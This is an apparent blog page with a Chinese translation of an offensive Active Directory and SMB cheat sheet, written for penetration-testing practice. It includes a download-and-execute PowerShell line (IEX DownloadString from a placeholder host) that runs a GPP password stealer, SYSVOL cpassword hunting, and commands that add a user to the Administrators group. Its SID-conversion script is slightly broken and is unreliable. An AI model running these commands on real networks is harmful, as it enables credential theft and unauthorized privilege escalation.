@@ -1,0 +1,1033 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="笔记说明：该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="活动目录-技术实现-h4rithd-2024.04.03版本">
+<meta property="og:url" content="https://sh1yan.top/2024/06/02/Active-Directory-Technical-Implementation-h4rithd-20240403/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="笔记说明：该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://docs.h4rithd.com/~gitbook/image?url=https://content.gitbook.com/content/nExgHyf5c0iANwFPNNH2/blobs/RpMyj9QLtZeDcKC1Zc6A/image.png&width=768&dpr=4&quality=100&sign=b982061e0f87ccd0043bcc22470240702d194d5f22e80c9872e0ddaa94549734">
+<meta property="article:published_time" content="2024-06-02T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-06-02T14:42:32.078Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="Offensive security">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://docs.h4rithd.com/~gitbook/image?url=https://content.gitbook.com/content/nExgHyf5c0iANwFPNNH2/blobs/RpMyj9QLtZeDcKC1Zc6A/image.png&width=768&dpr=4&quality=100&sign=b982061e0f87ccd0043bcc22470240702d194d5f22e80c9872e0ddaa94549734">
+  
+  
+  
+  <title>活动目录-技术实现-h4rithd-2024.04.03版本 - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="活动目录-技术实现-h4rithd-2024.04.03版本"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-02 23:50" pubdate>
+          2024年6月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          48k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          402 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">活动目录-技术实现-h4rithd-2024.04.03版本</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="笔记说明："><a href="#笔记说明：" class="headerlink" title="笔记说明："></a>笔记说明：</h1><p>该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。</p>
+<span id="more"></span>  
+
+<h1 id="活动目录-中小企业"><a href="#活动目录-中小企业" class="headerlink" title="活动目录&#x2F;中小企业"></a>活动目录&#x2F;中小企业</h1><p>Windows 的 SMB 枚举</p>
+<h2 id="00-基本注意事项"><a href="#00-基本注意事项" class="headerlink" title="00. 基本注意事项"></a>00. 基本注意事项</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg">思维导图</a></p>
+</li>
+<li><p>无论帐户以$符号结尾，都表示它是 a<code>machine account</code>或 a <code>manage service account</code>。</p>
+</li>
+<li><p>SID结构。</p>
+</li>
+</ul>
+<p><img src="https://docs.h4rithd.com/~gitbook/image?url=https://content.gitbook.com/content/nExgHyf5c0iANwFPNNH2/blobs/RpMyj9QLtZeDcKC1Zc6A/image.png&width=768&dpr=4&quality=100&sign=b982061e0f87ccd0043bcc22470240702d194d5f22e80c9872e0ddaa94549734" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="http://www.c-jump.com/CIS24/Slides/Registry/R01_0220_sid_format.htm">http://www.c-jump.com/CIS24/Slides/Registry/R01_0220_sid_format.htm</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 使用密码生成NTLM哈希</span><br>iconv <span class="hljs-operator">-f</span> ASCII <span class="hljs-literal">-t</span> UTF<span class="hljs-literal">-16LE</span> &lt;(printf <span class="hljs-string">&quot;&lt;Password&gt;&quot;</span>) | openssl dgst <span class="hljs-literal">-md4</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>objectSid</code>代表<code>SID</code>​</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">binary</span>):<br>    version = struct.unpack(<span class="hljs-string">&#x27;B&#x27;</span>, binary[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>])[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># 我不知道如何对待版本 != 1 (it does not exist yet)</span><br>    <span class="hljs-keyword">assert</span> version == <span class="hljs-number">1</span>, version<br>    length = struct.unpack(<span class="hljs-string">&#x27;B&#x27;</span>, binary[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>])[<span class="hljs-number">0</span>]<br>    authority = struct.unpack(<span class="hljs-string">b&#x27;&gt;Q&#x27;</span>, <span class="hljs-string">b&#x27;\x00\x00&#x27;</span> + binary[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>])[<span class="hljs-number">0</span>]<br>    string = <span class="hljs-string">&#x27;S-%d-%d&#x27;</span> % (version, authority)<br>    binary = binary[<span class="hljs-number">8</span>:]<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(binary) == <span class="hljs-number">4</span> * length<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>        value = struct.unpack(<span class="hljs-string">&#x27;&lt;L&#x27;</span>, binary[<span class="hljs-number">4</span>*i:<span class="hljs-number">4</span>*(i+<span class="hljs-number">1</span>)])[<span class="hljs-number">0</span>]<br>        string += <span class="hljs-string">&#x27;-%d&#x27;</span> % value<br>    <span class="hljs-keyword">return</span> string<br><br><span class="hljs-built_in">print</span>(base64.b64decode(sys.argv[<span class="hljs-number">1</span>]))<br><br><span class="hljs-comment">##python3 binary2SID.py &lt;base64==&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>基本命令</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 是否已加入/连接到域？</span><br><span class="hljs-comment">##[Windows]</span><br>systeminfo | findstr /B <span class="hljs-string">&quot;Domain&quot;</span><br><span class="hljs-comment">### 如果您看到域以外的内容：WORKGROUP，那么您很可能已加入域</span><br><span class="hljs-comment">##[Linux]</span><br><span class="hljs-built_in">ls</span> <span class="hljs-literal">-al</span> /etc/krb5.conf<br>kinit <span class="hljs-literal">-k</span> host/<span class="hljs-variable">$</span>(hostname <span class="hljs-operator">-f</span>)<br><br><span class="hljs-comment">## ------------------| Enumerating Domain Admins</span><br>net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain<br><br><span class="hljs-comment">## ------------------| Enumerating server admins</span><br>net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;Server_Admin&quot;</span> /domain<br><br><span class="hljs-comment">## ------------------| 列出整个域中的所有用户</span><br>net user /domain<br><br><span class="hljs-comment">## ------------------| List all groups</span><br>net <span class="hljs-built_in">group</span> /domain<br><br><span class="hljs-comment">## ------------------| 列出h4rith用户的组</span><br>net user h4rith /domain<br><br><span class="hljs-comment">## ------------------| 当前域信息</span><br>[<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()<br><br><span class="hljs-comment">## ------------------| 域信任</span><br>([<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Domain</span>]::GetCurrentDomain()).GetAllTrustRelationships()<br><br><span class="hljs-comment">## ------------------| 当前林信息</span><br>[<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Forest</span>]::GetCurrentForest()<br><br><span class="hljs-comment">## ------------------| 获取林信任关系</span><br>([<span class="hljs-type">System.DirectoryServices.ActiveDirectory.Forest</span>]::GetForest((<span class="hljs-built_in">New-Object</span> System.DirectoryServices.ActiveDirectory.DirectoryContext(<span class="hljs-string">&#x27;Forest&#x27;</span>, <span class="hljs-string">&#x27;forest-of-interest.local&#x27;</span>)))).GetAllTrustRelationships()<br><br><span class="hljs-comment">## ------------------| 获取域的DC</span><br>nltest /dclist:offense.local<br>net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain controllers&quot;</span> /domain<br><br><span class="hljs-comment">## ------------------| 获取当前已验证会话的DC</span><br>nltest /dsgetdc:offense.local<br><br><span class="hljs-comment">## ------------------| 从cmd shell获取域信任</span><br>nltest /domain_trusts<br><br><span class="hljs-comment">## ------------------| Get user info</span><br>nltest /user:<span class="hljs-string">&quot;spotless&quot;</span><br><br><span class="hljs-comment">## ------------------| List smb shares</span><br><span class="hljs-built_in">Get-SmbShare</span><br><span class="hljs-built_in">Get-SmbShare</span> <span class="hljs-literal">-Name</span> C<span class="hljs-variable">$</span> | <span class="hljs-built_in">select</span> *<br><br><span class="hljs-comment">## ------------------| Creating a new file share</span><br><span class="hljs-built_in">New-SmbShare</span> <span class="hljs-literal">-Name</span> &lt;ShareName&gt; <span class="hljs-literal">-Description</span> <span class="hljs-string">&quot;This is description&quot;</span> <span class="hljs-literal">-Path</span> C:\Shares\&lt;ShareName&gt;      <br><br><span class="hljs-comment">## ------------------| 修改共享属性</span><br><span class="hljs-built_in">Set-SmbShare</span> <span class="hljs-literal">-Name</span> &lt;ShareName&gt; <span class="hljs-literal">-Description</span> <span class="hljs-string">&quot;This is description&quot;</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-comment">## ------------------| 正在授予文件共享权限。</span><br><span class="hljs-built_in">Grant-SmbShareAccess</span> <span class="hljs-literal">-Name</span> &lt;ShareName&gt; <span class="hljs-literal">-AccountName</span> &lt;DOMAIN&gt;\&lt;USER&gt; <span class="hljs-literal">-AccessRight</span> Full <span class="hljs-literal">-Force</span><br><span class="hljs-comment">## 您可以使用Everyone代替&lt;DOMAIN&gt;\&lt;USER&gt;</span><br><span class="hljs-comment">## 您可以使用“读取”、“更改”、“自定义”代替“完全”。</span><br><br><span class="hljs-comment">## ------------------| 正在删除文件共享权限</span><br><span class="hljs-built_in">Revoke-SmbShareAccess</span> <span class="hljs-literal">-Name</span> &lt;ShareName&gt; <span class="hljs-literal">-AccountName</span> &lt;DOMAIN&gt;\&lt;USER&gt; <span class="hljs-literal">-Force</span><br><span class="hljs-comment">## 您可以使用Everyone代替&lt;DOMAIN&gt;\&lt;USER&gt;</span><br><br><span class="hljs-comment">## ------------------| 拒绝对文件共享的权限</span><br><span class="hljs-built_in">Block-SmbShareAccess</span> <span class="hljs-literal">-Name</span> &lt;ShareName&gt; <span class="hljs-literal">-AccountName</span> &lt;DOMAIN&gt;\&lt;USER&gt; <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">UnBlock-SmbShareAccess</span> <span class="hljs-literal">-Name</span> &lt;ShareName&gt; <span class="hljs-literal">-AccountName</span> &lt;DOMAIN&gt;\&lt;USER&gt; <span class="hljs-literal">-Force</span><br><span class="hljs-comment">## 您可以使用Everyone代替&lt;DOMAIN&gt;\&lt;USER&gt;</span><br><br><span class="hljs-comment">## ------------------| 删除文件共享</span><br><span class="hljs-built_in">Remove-SmbShare</span> <span class="hljs-literal">-Name</span> &lt;ShareName&gt; <span class="hljs-literal">-Force</span><br><br><span class="hljs-comment">## ------------------| 获取当前已验证会话的DC</span><br><span class="hljs-built_in">set</span> l<br><br><span class="hljs-comment">## ------------------| 获取通过身份验证的用户的域名和DC</span><br>klist<br><br><span class="hljs-comment">## ------------------| 获取所有登录会话。包括NTLM身份验证会话</span><br>klist sessions<br><br><span class="hljs-comment">## ------------------| 会话的Kerberos票证</span><br>klist<br><br><span class="hljs-comment">## ------------------| Kached krbtgt</span><br>klist tgt<br><br><span class="hljs-comment">## ------------------| 旧Windows系统上的Whoami</span><br><span class="hljs-built_in">set</span> u<br><br><span class="hljs-comment">## ------------------| 使用ADModule查找DFS共享</span><br><span class="hljs-built_in">Get-ADObject</span> <span class="hljs-literal">-filter</span> * <span class="hljs-literal">-SearchBase</span> <span class="hljs-string">&quot;CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;</span> | <span class="hljs-built_in">select</span> name<br><br><span class="hljs-comment">## ------------------| 使用ADSI查找DFS共享</span><br><span class="hljs-variable">$s</span>=[<span class="hljs-type">adsisearcher</span>]<span class="hljs-string">&#x27;(name=*)&#x27;</span>; <span class="hljs-variable">$s</span>.SearchRoot = [<span class="hljs-type">adsi</span>]<span class="hljs-string">&quot;LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local&quot;</span>; <span class="hljs-variable">$s</span>.FindAll() | % &#123;<span class="hljs-variable">$_</span>.properties.name&#125;<br><br><span class="hljs-comment">## ------------------| 检查后台处理程序服务是否正在主机上运行</span><br>powershell <span class="hljs-built_in">ls</span> <span class="hljs-string">&quot;\\dc01\pipe\spoolss&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>在以下位置查找 GPP 密码<code>SYSVOL</code></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Manual</span><br>findstr /S cpassword <span class="hljs-variable">$env:logonserver</span>\sysvol\*.xml<br>findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)<br>findstr /S /I cpassword \\&lt;DOMAIN&gt;\sysvol\&lt;DOMAIN&gt;\policies\*.xml<br><br><span class="hljs-comment">## ------------------| PowerSploit</span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/<span class="hljs-built_in">Get-GPPPassword</span>.ps1 <br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://&lt;IP&gt;/Get-GPPPassword.ps1&#x27;</span>)<br><span class="hljs-built_in">Get-GPPPassword</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>组列表。</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 添加到远程桌面用户</span><br>net localgroup <span class="hljs-string">&quot;Remote Desktop Users&quot;</span> harith /add<br><br><span class="hljs-comment">## ------------------| 添加到WinRM用户</span><br>net localgroup <span class="hljs-string">&quot;Remote Management Users&quot;</span> harith /add<br><br><span class="hljs-comment">## ------------------| 添加到管理员组</span><br>net localgroup <span class="hljs-string">&quot;Administrators&quot;</span> harith  /add<br></code></pre></td></tr></table></figure>
+
+<h2 id="01-SMB枚举"><a href="#01-SMB枚举" class="headerlink" title="01.SMB枚举"></a>01.SMB枚举</h2><h3 id="00-基本"><a href="#00-基本" class="headerlink" title="00.基本"></a>00.基本</h3><ul>
+<li>查找smb版本</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sudo tcpdump <span class="hljs-literal">-s0</span> <span class="hljs-literal">-n</span> <span class="hljs-literal">-i</span> tun0 src <span class="hljs-variable">$IP</span> and port <span class="hljs-number">139</span> <span class="hljs-literal">-A</span> <span class="hljs-literal">-c</span> <span class="hljs-number">10</span> <span class="hljs-number">2</span>&gt;/dev/null | grep <span class="hljs-literal">-i</span> <span class="hljs-string">&quot;samba\|s.a.m&quot;</span> | tr <span class="hljs-literal">-d</span> <span class="hljs-string">&#x27;.&#x27;</span>        <br>sudo ngrep <span class="hljs-literal">-i</span> <span class="hljs-literal">-d</span> tun0 <span class="hljs-string">&#x27;s.?a.?m.?b.?a.*[[:digit:]]&#x27;</span> port <span class="hljs-number">139</span><br>smbclient <span class="hljs-literal">-L</span> //<span class="hljs-variable">$IP</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="01-SMB客户端"><a href="#01-SMB客户端" class="headerlink" title="01.SMB客户端"></a>01.SMB客户端</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| List all </span><br>smbclient <span class="hljs-literal">-N</span> <span class="hljs-literal">-L</span> //&lt;IP&gt;<br><br><span class="hljs-comment">## ------------------| 对于旧的smba版本</span><br>smbclient <span class="hljs-literal">-N</span> //&lt;IP&gt;/ <span class="hljs-literal">--option</span>=<span class="hljs-string">&#x27;client min protocol=NT1&#x27;</span> <br><br><span class="hljs-comment">## ------------------| 下载所有文件</span><br>smbclient <span class="hljs-literal">-N</span> //&lt;IP&gt;/&lt;SHARENAME&gt; <span class="hljs-literal">-U</span> &lt;USERNAME&gt; <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;prompt OFF;recurse ON;mget *&quot;</span><br><br><span class="hljs-comment">## ------------------| 登录到用户</span><br>smbclient <span class="hljs-literal">-U</span> &lt;UserName&gt;%&lt;Password&gt; \\\\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.178</span>\\c<span class="hljs-variable">$</span><br><br><span class="hljs-comment">## ------------------| 列出有关的信息</span><br><span class="hljs-comment">## 如果它有ACL:Everyone:ALLOWED/OI|CI/FULL，我们可以写/读</span><br>smbcacls <span class="hljs-literal">-N</span> //<span class="hljs-number">10.10</span>.<span class="hljs-number">10.103</span>/Department /Users<br></code></pre></td></tr></table></figure>
+
